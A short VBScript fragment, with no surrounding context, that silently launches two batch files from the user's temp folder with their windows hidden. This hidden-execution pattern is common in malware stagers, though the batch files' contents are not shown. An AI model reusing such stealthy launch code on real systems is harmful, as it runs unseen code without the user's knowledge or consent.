Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "%temp%\post.bat", 0, True
objShell.Run "%temp%\pro.bat", 0, False
